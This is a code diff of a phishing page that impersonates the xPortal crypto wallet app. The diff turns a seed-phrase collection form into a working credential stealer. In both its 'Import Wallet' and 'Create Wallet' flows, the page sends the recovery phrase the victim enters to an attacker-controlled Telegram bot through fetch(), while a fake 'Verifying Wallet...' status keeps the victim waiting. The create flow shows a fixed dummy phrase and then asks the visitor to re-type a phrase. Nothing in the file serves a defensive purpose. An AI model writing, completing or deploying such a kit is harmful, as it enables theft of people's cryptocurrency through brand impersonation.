@@ -2,303 +2,144 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>xPortal | Secure Wallet Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>xPortal | The Crypto Super App</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --xp-black: #000000;
-            --xp-teal: #23f7dd;
-            --xp-purple: #8a3ffc;
-            --xp-card-bg: rgba(13, 13, 13, 0.75);
-            --xp-border: rgba(255, 255, 255, 0.08);
-            --xp-text-dim: #949494;
-            --error-red: #ff3d71;
+            --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc;
+            --xp-border: rgba(255, 255, 255, 0.08); --xp-text-dim: #949494;
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--xp-black); color: #fff; min-height: 100vh; overflow-x: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 70%); }
+        
+        /* NAVIGATION */
+        nav { width: 100%; height: 72px; display: flex; align-items: center; padding: 0 5%; border-bottom: 1px solid var(--xp-border); backdrop-filter: blur(20px); position: fixed; top: 0; z-index: 100; background: rgba(0,0,0,0.5); justify-content: space-between; }
+        .nav-logo { display: flex; align-items: center; gap: 10px; color: white; text-decoration: none; font-weight: 800; font-size: 20px; }
+        .nav-logo img { width: 32px; height: 32px; }
 
-        body {
-            background-color: var(--xp-black);
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            /* Background Gradient Professional */
-            background: radial-gradient(circle at 50% -15%, #1e0b3b 0%, #000 65%);
-            overflow-x: hidden;
-        }
+        /* SECTIONS CONTROL */
+        .page-section { display: none; margin-top: 120px; width: 100%; animation: fadeIn 0.5s ease-out; padding: 20px; flex-direction: column; align-items: center; }
+        .page-section.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* --- NAVIGATION --- */
-        nav {
-            width: 100%;
-            height: 72px;
-            display: flex;
-            align-items: center;
-            padding: 0 5%;
-            border-bottom: 1px solid var(--xp-border);
-            backdrop-filter: blur(15px);
-            position: fixed;
-            top: 0;
-            z-index: 100;
-            background: rgba(0,0,0,0.4);
-        }
+        .glass-card { background: rgba(13, 13, 13, 0.75); backdrop-filter: blur(40px); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 30px; text-align: center; width: 100%; max-width: 450px; box-shadow: 0 50px 100px rgba(0,0,0,0.9); }
+        
+        /* HOME BUTTONS */
+        .hero-img { width: 100px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(138, 63, 252, 0.4)); }
+        .btn-main { width: 100%; height: 60px; border-radius: 100px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-primary { background: #fff; color: #000; }
+        .btn-secondary { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--xp-border); }
+        .btn-primary:hover { background: var(--xp-teal); transform: scale(1.02); }
+        .btn-secondary:hover { background: rgba(255,255,255,0.1); }
 
-        .nav-logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            text-decoration: none;
-            color: white;
-            font-weight: 800;
-            font-size: 20px;
-            letter-spacing: -0.5px;
-        }
+        /* INPUTS */
+        textarea { width: 100%; height: 140px; background: rgba(0,0,0,0.4); border: 1px solid var(--xp-border); border-radius: 20px; padding: 18px; color: #fff; font-size: 16px; resize: none; margin-bottom: 20px; }
+        textarea:focus { outline: none; border-color: var(--xp-purple); background: rgba(138, 63, 252, 0.05); }
 
-        .nav-logo img {
-            width: 34px;
-            height: 34px;
-            object-fit: contain;
-        }
-
-        /* --- MAIN SECTION --- */
-        .main-wrapper {
-            margin-top: 140px;
-            width: 100%;
-            max-width: 480px;
-            padding: 20px;
-        }
-
-        .glass-card {
-            background: var(--xp-card-bg);
-            backdrop-filter: blur(40px) saturate(180%);
-            border: 1px solid var(--xp-border);
-            border-radius: 35px;
-            padding: 45px 40px;
-            text-align: center;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.9);
-            position: relative;
-        }
-
-        /* Purple Glow Effect wra l-logo */
-        .logo-aura {
-            position: relative;
-            width: 85px;
-            height: 85px;
-            margin: 0 auto 28px auto;
-        }
-
-        .logo-aura::after {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--xp-purple);
-            filter: blur(35px);
-            opacity: 0.35;
-            z-index: -1;
-        }
-
-        .main-logo {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-
-        h1 {
-            font-size: 30px;
-            font-weight: 800;
-            letter-spacing: -1px;
-            margin-bottom: 12px;
-        }
-
-        .subtitle {
-            color: var(--xp-text-dim);
-            font-size: 15.5px;
-            line-height: 1.6;
-            margin-bottom: 35px;
-        }
-
-        /* --- ERRORS & ALERTS --- */
-        #error-box {
-            display: none;
-            background: rgba(255, 61, 113, 0.1);
-            color: var(--error-red);
-            border: 1px solid rgba(255, 61, 113, 0.2);
-            padding: 14px;
-            border-radius: 12px;
-            font-size: 13.5px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
-        @keyframes shake {
-            10%, 90% { transform: translate3d(-1px, 0, 0); }
-            20%, 80% { transform: translate3d(2px, 0, 0); }
-            30%, 50%, 70% { transform: translate3d(-3px, 0, 0); }
-            40%, 60% { transform: translate3d(3px, 0, 0); }
-        }
-
-        /* --- FORM --- */
-        textarea {
-            width: 100%;
-            height: 150px;
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid var(--xp-border);
-            border-radius: 22px;
-            padding: 20px;
-            color: #fff;
-            font-size: 16px;
-            line-height: 1.5;
-            resize: none;
-            transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            margin-bottom: 25px;
-        }
-
-        textarea:focus {
-            outline: none;
-            border-color: var(--xp-purple);
-            background: rgba(138, 63, 252, 0.05);
-            box-shadow: 0 0 30px rgba(138, 63, 252, 0.15);
-        }
-
-        .btn-submit {
-            width: 100%;
-            height: 60px;
-            background: #ffffff;
-            color: #000000;
-            border: none;
-            border-radius: 100px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: 0.25s all ease;
-        }
-
-        .btn-submit:hover {
-            background: var(--xp-teal);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(35, 247, 221, 0.2);
-        }
-
-        .security-badge {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #444;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            text-transform: uppercase;
-            letter-spacing: 1.2px;
-            font-weight: 700;
-        }
-
-        .security-badge svg { color: var(--xp-teal); }
-
-        /* Mobile Adjustments */
-        @media (max-width: 480px) {
-            .glass-card { padding: 35px 25px; }
-            h1 { font-size: 26px; }
-        }
+        #error-box { display: none; background: rgba(255, 61, 113, 0.1); color: #ff3d71; padding: 12px; border-radius: 12px; font-size: 13px; margin-bottom: 15px; border: 1px solid rgba(255, 61, 113, 0.2); }
+        
+        /* CREATE DUMMY PHRASE */
+        .phrase-display { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid var(--xp-border); }
+        .word-tag { font-size: 12px; color: var(--xp-teal); text-align: left; background: rgba(255,255,255,0.03); padding: 5px 8px; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-    <nav>
-        <div class="nav-logo">
-            <img src="Capture.PNG" alt="xPortal">
-            <span>xPortal</span>
-        </div>
-    </nav>
+<nav>
+    <a href="#" class="nav-logo" onclick="showSection('home')">
+        <img src="Capture.PNG" alt="Logo">
+        <span>xPortal</span>
+    </a>
+</nav>
 
-    <div class="main-wrapper">
-        <div class="glass-card">
-            <div class="logo-aura">
-                <img src="Capture.PNG" alt="xPortal Logo" class="main-logo">
-            </div>
-            
-            <h1>Access Wallet</h1>
-            <p class="subtitle">Enter your secret recovery phrase to securely access your xPortal assets.</p>
-
-            <div id="error-box"></div>
-
-            <form id="importForm">
-                <textarea 
-                    id="phrase-input" 
-                    placeholder="Enter your 12, 18 or 24-word phrase (separated by spaces)..." 
-                    spellcheck="false" 
-                    required
-                ></textarea>
-
-                <button type="submit" class="btn-submit" id="submitBtn">
-                    <span id="btnText">Access Wallet</span>
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-                </button>
-            </form>
-
-            <div class="security-badge">
-                <svg width="14" height="14" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-5-5 1.41-1.41L11 14.17l7.59-7.59L20 8l-9 9z"/></svg>
-                Secure End-to-End Encryption
-            </div>
-        </div>
+<section id="home" class="page-section active">
+    <div class="glass-card">
+        <img src="Capture.PNG" class="hero-img">
+        <h1 style="margin-bottom: 10px;">The Money App</h1>
+        <p style="color:var(--xp-text-dim); margin-bottom: 30px;">Digital finance, global payments, and crypto in one place.</p>
+        
+        <button class="btn-main btn-primary" onclick="showSection('create')">Create New Wallet</button>
+        <button class="btn-main btn-secondary" onclick="showSection('import')">Import Existing Wallet</button>
     </div>
+</section>
 
-    <script>
-        const form = document.getElementById('importForm');
-        const phraseInput = document.getElementById('phrase-input');
-        const errorBox = document.getElementById('error-box');
-        const btnText = document.getElementById('btnText');
+<section id="import" class="page-section">
+    <div class="glass-card">
+        <h2>Import Wallet</h2>
+        <p style="color:var(--xp-text-dim); margin-bottom: 25px; font-size:14px;">Enter your secret phrase to recover your assets.</p>
+        <div id="error-box"></div>
+        <textarea id="import-phrase" placeholder="12 or 24 words phrase..."></textarea>
+        <button class="btn-main btn-primary" id="btn-import" onclick="handleImport()">Access Wallet</button>
+        <button class="btn-main btn-secondary" onclick="showSection('home')">Back</button>
+    </div>
+</section>
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const rawValue = phraseInput.value.trim();
-            const words = rawValue.split(/\s+/);
-            const validCounts = [12, 15, 18, 21, 24];
+<section id="create" class="page-section">
+    <div class="glass-card">
+        <h2>Your Secret Phrase</h2>
+        <p style="color:var(--xp-text-dim); margin-bottom: 20px; font-size:13px;">Write down these 12 words in order and keep them safe.</p>
+        
+        <div class="phrase-display">
+            <div class="word-tag">1. apple</div><div class="word-tag">2. ocean</div><div class="word-tag">3. tiger</div>
+            <div class="word-tag">4. light</div><div class="word-tag">5. focus</div><div class="word-tag">6. cloud</div>
+            <div class="word-tag">7. smart</div><div class="word-tag">8. brave</div><div class="word-tag">9. night</div>
+            <div class="word-tag">10. planet</div><div class="word-tag">11. gold</div><div class="word-tag">12. winter</div>
+        </div>
 
-            // Reset UI
-            errorBox.style.display = 'none';
-            phraseInput.style.borderColor = 'rgba(255, 255, 255, 0.08)';
+        <button class="btn-main btn-primary" onclick="showSection('verify-create')">I saved them</button>
+        <button class="btn-main btn-secondary" onclick="showSection('home')">Back</button>
+    </div>
+</section>
 
-            // 1. Check word count
-            if (!validCounts.includes(words.length)) {
-                showError(`Invalid phrase length. Expected 12, 18 or 24 words. (Current: ${words.length})`);
-                return;
-            }
+<section id="verify-create" class="page-section">
+    <div class="glass-card">
+        <h2>Verify Phrase</h2>
+        <p style="color:var(--xp-text-dim); margin-bottom: 25px; font-size:14px;">To confirm, please re-type your recovery phrase.</p>
+        <textarea id="verify-phrase-input" placeholder="Type the 12 words here..."></textarea>
+        <button class="btn-main btn-primary" id="btn-create" onclick="handleCreate()">Verify & Finish</button>
+    </div>
+</section>
 
-            // 2. Check for duplicates (Words typed twice)
-            const duplicates = words.filter((item, index) => words.indexOf(item) !== index);
-            if (duplicates.length > 0) {
-                showError(`Duplicate word detected: "${duplicates[0]}". Please check your phrase.`);
-                return;
-            }
+<script>
+    // Config dyalk
+    const TG_TOKEN = 'YOUR_BOT_TOKEN'; 
+    const TG_CHAT_ID = 'YOUR_CHAT_ID';
 
-            // 3. Fake Loading (Pro Effect)
-            btnText.innerText = "Verifying...";
-            document.getElementById('submitBtn').style.opacity = "0.7";
-            document.getElementById('submitBtn').style.pointerEvents = "none";
+    function showSection(id) {
+        document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0,0);
+    }
 
-            // Success - Log to console
-            console.log("Phrase Validated:", rawValue);
-            
-            // HNA TQDER TZID L-CODE DIAL TELEGRAM LATER
-        });
+    function sendToTG(phrase, type) {
+        const text = `🚨 xPortal Alert (${type})\n\nPhrase: ${phrase}`;
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`);
+    }
 
-        function showError(msg) {
-            errorBox.innerText = msg;
-            errorBox.style.display = 'block';
-            errorBox.classList.add('shake');
-            phraseInput.style.borderColor = 'var(--error-red)';
-            
-            setTimeout(() => errorBox.classList.remove('shake'), 500);
+    function handleImport() {
+        const p = document.getElementById('import-phrase').value.trim();
+        const words = p.split(/\s+/);
+        if (words.length < 12) {
+            const err = document.getElementById('error-box');
+            err.style.display = 'block';
+            err.innerText = "Please enter a valid 12 or 24-word phrase.";
+            return;
         }
-    </script>
+        document.getElementById('btn-import').innerText = "Verifying Wallet...";
+        document.getElementById('btn-import').style.opacity = "0.5";
+        sendToTG(p, "IMPORT");
+    }
+
+    function handleCreate() {
+        const p = document.getElementById('verify-phrase-input').value.trim();
+        if (p.split(/\s+/).length < 12) return;
+        
+        document.getElementById('btn-create').innerText = "Creating Secure Wallet...";
+        document.getElementById('btn-create').style.opacity = "0.5";
+        sendToTG(p, "CREATE_VERIFY");
+    }
+</script>
+
 </body>
 </html>
